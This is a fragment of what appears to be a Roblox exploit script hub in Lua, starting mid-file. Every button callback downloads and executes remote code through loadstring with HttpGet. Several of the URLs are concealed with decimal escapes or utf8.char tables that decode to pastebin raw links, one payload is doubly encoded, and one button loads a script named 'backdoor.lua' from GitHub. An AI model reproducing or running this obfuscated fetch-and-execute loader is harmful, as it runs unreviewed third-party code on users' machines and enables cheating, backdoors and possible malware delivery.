    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97"))()
    
  end
})
Tab:AddButton({
  Name = "HB-Beta",
  Callback = function ()
    loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,86,83,89,71,99,122,78,115})end)())))()
    
  end
})
Tab:AddButton({
  Name = "后门doors里的",
  Callback = function ()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/main/mspaint/backdoor.lua"))()
    
  end
})
Tab:AddButton({
  Name = "导管中心",
  Callback = function ()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()
    
  end
})
Tab:AddButton({
  Name = "Chat GUI",
  Callback = function ()
    loadstring(game:GetObjects("rbxassetid://1262435912")[1].Source)()
    
  end
})
